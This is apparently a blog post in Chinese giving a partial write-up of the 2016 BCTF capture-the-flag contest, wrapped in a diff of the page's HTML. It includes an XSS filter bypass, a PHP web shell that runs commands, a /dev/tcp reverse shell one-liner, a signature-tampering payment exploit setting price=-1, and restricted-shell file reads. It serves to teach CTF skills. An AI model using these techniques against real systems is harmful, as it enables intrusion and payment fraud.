@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>bctf 部分writeup - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="bctf 部分writeup - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/690/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>bctf 部分writeup</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-03-21 02:02"><i class="iconfont icon-date"></i>2016-03-21 02:02</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>又是一个和ctf一起度过的疲惫的周末。</p>
+
+<h2 id="qaq">QAQ</h2>
+<p>一个留言板，提交之后可以看到部分内容被过滤了，包括<code class="highlighter-rouge">on</code>、<code class="highlighter-rouge">script</code>、<code class="highlighter-rouge">img</code>等，最终发现<code class="highlighter-rouge">iframe</code>标签没被过滤，而且可以利用的是<code class="highlighter-rouge">src</code>和<code class="highlighter-rouge">srcdoc</code>属性，<code class="highlighter-rouge">srcdoc</code>使用html实体编码绕过。其中我遇到一个坑，就是开始认为<code class="highlighter-rouge">&amp;</code>也被过滤了，而实际上是我没进行url编码，导致burp识别错误。</p>
+
+<p>主办方的机器人一直不太稳定，第二天才真正的开始做这个题，xss探测结果是后台在<code class="highlighter-rouge">http://104.199.132.251/4dm1n/show.php</code>，cookies没啥用，页面源码也是只个列表，也没啥用。后来看到提示，说可以探测内网，想起使用webrtc，参考 http://www.wooyun.org/bugs/wooyun-2014-076685。</p>
+
+<!--more-->
+
+<p>payload见https://dl.dropboxusercontent.com/u/1878671/enumhosts.html，修改了代码，增加了回传ip信息。ip包括本机172.17.0.1，和三个192.168.1.x的，猜测就是192的了，但是使用js访问了一遍，都失败了，要不是不能访问，要不就是没设置跨域的http头。然后想起又访问了一遍172的内网，发现172.17.0.2是可以的，很高兴。</p>
+
+<p>这个ip访问到的内容是</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="c">&lt;!--
+header("Access-Control-Allow-Origin: *");
+$ztz= 'system';
+ob_start($ztz);
+echo $_GET[c];
+ob_end_flush();
+--&gt;</span>
+</code></pre>
+</div>
+
+<p>没有回显，需要反弹shell，使用<code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>的没反应，猜测是遇到了编码的坑，换用了wget一个python脚本然后执行，然后反弹就成功了。</p>
+
+<h2 id="zerodaystore">zerodaystore</h2>
+<p>给了一个安卓apk和一段server的Python代码，代码见 https://gist.github.com/virusdefender/9aec40d6ae73ead56429</p>
+
+<p>安卓大致的逆向了一下，就觉得order和pay的url是有用的，其余没啥问题。问题应该在server上，需要修改price。</p>
+
+<p>可控的位置是<code class="highlighter-rouge">androidID</code>，一般混淆也就是它的值设置为<code class="highlighter-rouge">123&amp;price=-1</code>，但是这里会在循环中被实际的price覆盖掉。</p>
+
+<p>后来在想到需要利用Python的base64解码的特点，</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s">"xxxxxxxxxx"</span><span class="p">)</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="s">'eHh4eHh4eHh4eA=='</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">"eHh4eHh4eHh4eA=="</span><span class="p">)</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="s">'xxxxxxxxxx'</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">"eHh4eHh4eHh4eA==!"</span><span class="p">)</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="s">'xxxxxxxxxx'</span>
+
+<span class="n">In</span> <span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">"eHh4eHh4eHh4eA==!eHh4eHh4eHh4eA=="</span><span class="p">)</span>
+<span class="n">Out</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="s">'xxxxxxxxxx'</span>
+</code></pre>
+</div>
+
+<p>这样把price放在最后面就可以了。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="k">print</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://paygate.godric.me/pay"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">"orderID=12368911859&amp;price=80000&amp;productID=1&amp;timestamp=1458482306973&amp;signer=RSA&amp;hash=sha256&amp;nonce=733d2f88ea74af8a&amp;sign=TzdQaIa7qT/tTb6UNvzl25irdxiFYOj3hq932Wdozzkazsj1cIpzEhE2mnrUewwnuG2lPGpulqdMTGgMJgsUYWrKxEjpk3EKnWukgASyfap9N9EcsgKw67/2wJ00o1Nxc098jTxurLnW2lBfSXNQySDI+M7o0NzD58nYq/Rjzl3NkYFlF+fTf+ZxejM0J+uZCDDi7BZoFhTpFXrV0OPso6Ltefb+o0ZvI6YcBULHRdOVIhzhhnkY68xTBI2ULAH0OEttDls7PlLZnEYYuT92oSr7Q38W6ilpe1EG27czkVCVbuK3AMvfwaLbQnajuOrNz+JumG7TdFSbkwl8Rfgarw==!&amp;price=-1"</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+</code></pre>
+</div>
+
+<p>验证代码取到的sign就是带有<code class="highlighter-rouge">!&amp;price=-1</code>的，但是base64解码后还和原来的是一样的，而解析price的时候却会读取到最后一个price。</p>
+
+<p>结果是<code class="highlighter-rouge"><span class="p">{</span><span class="nt">"status"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="nt">"data"</span><span class="p">:</span><span class="w"> </span><span class="s2">"BCTF{0DayL0veR1chGuy5}"</span><span class="p">}</span></code></p>
+
+<h2 id="hsab">hsab</h2>
+<p>一开始需要跑一段hash，还是需要暴力，不过还是挺快的。</p>
+
+<blockquote>
+  <p>I would like some proof of work. Send me a string starting with
+‘vfgckhse’, no whitespace, of length &lt;= 63, such that its sha256 in
+binary starts with 20 bits of zeros.</p>
+</blockquote>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">urandom</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="s">'104.199.132.199'</span><span class="p">,</span> <span class="mi">2222</span><span class="p">))</span>
+<span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">'starting with </span><span class="se">\'</span><span class="s">'</span><span class="p">)</span>
+<span class="n">t</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">'</span><span class="se">\'</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">sha256</span><span class="p">(</span><span class="n">t</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'00000'</span><span class="p">):</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">t</span> <span class="o">+</span> <span class="n">x</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">break</span>
+</code></pre>
+</div>
+
+<p>之后发现里面很多命令都没有了，比如<code class="highlighter-rouge">ls</code>、<code class="highlighter-rouge">cat</code>等，包括<code class="highlighter-rouge">gcc</code>、<code class="highlighter-rouge">python</code>之类的。之后发现输入<code class="highlighter-rouge">help</code>可以看到所有的命令。</p>
+
+<p>在网上找到<code class="highlighter-rouge">echo /tmp/*</code>就相当于<code class="highlighter-rouge">ls /tmp</code>，就这样找到了<code class="highlighter-rouge">/home/ctf/flag.ray</code>，但是没有cat，没法读文件。</p>
+
+<p>尝试使用重定向符号，但是只有重定向到文件是好的，比如<code class="highlighter-rouge">echo 123 &gt; 456</code>，而反向的话就会报语法错误。</p>
+
+<p>后来使用<code class="highlighter-rouge">bash -v flag.ray</code>搞定了。不加参数的话，就是输出<code class="highlighter-rouge">.bashrc</code>的内容。</p>
+
+<p>后来听说还可以用用<code class="highlighter-rouge">dlcall</code>，但是我从没见过，只有https://github.com/taviso/ctypes.sh/wiki上有些介绍，看样子和C语言语法很像，但是写起来很奇怪。最终的payload是</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n file -r pointer fopen "/home/ctf/flag.ray" "r"</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n content -r pointer malloc 128</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n text fread $content 128 1 $file</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall printf $text</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+</code></pre>
+</div>
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=bctf 部分writeup&article_id=/index.php/archives/690/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
